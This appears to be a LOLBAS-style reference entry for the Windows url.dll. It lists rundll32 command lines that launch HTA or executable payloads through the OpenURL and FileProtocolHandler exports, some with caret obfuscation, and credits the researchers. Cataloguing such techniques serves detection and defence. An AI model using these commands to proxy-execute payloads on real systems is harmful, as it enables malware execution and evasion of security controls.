## Url.dll
* Functions: Execute
```

rundll32.exe url.dll,OpenURL "C:\\test\\calc.hta"
Launch a HTML application payload by calling OpenURL.

rundll32.exe url.dll,OpenURL "C:\\test\\calc.url"
Launch an executable payload via proxy through a(n) URL (information) file by calling OpenURL.

rundll32.exe url.dll,OpenURL file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e
Launch an executable payload by calling OpenURL.

rundll32.exe url.dll,FileProtocolHandler calc.exe
Launch an executable payload by calling FileProtocolHandler.

rundll32.exe url.dll,FileProtocolHandler file:///C:/test/test.hta
Launch a HTML application payload by calling FileProtocolHandler.

rundll32 url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e
Launch an executable payload by calling FileProtocolHandler.
```
   
* Resources:   
  * https://bohops.com/2018/03/17/abusing-exported-functions-and-exposed-dcom-interfaces-for-pass-thru-command-execution-and-lateral-movement/
  * https://twitter.com/bohops/status/974043815655956481
  * https://twitter.com/DissectMalware/status/995348436353470465
  * https://twitter.com/yeyint_mth/status/997355558070927360
  * https://twitter.com/Hexacorn/status/974063407321223168
   
* Full path:   
  * c:\windows\system32\url.dll
  * c:\windows\sysWOW64\url.dll
   
* Notes: Thanks to Jimmy - @bohops (OpenURL), Adam - @hexacorn (OpenURL), Malwrologist - @DissectMalware (FileProtocolHandler - HTA), r0lan - @yeyint_mth (Obfuscation)  
   
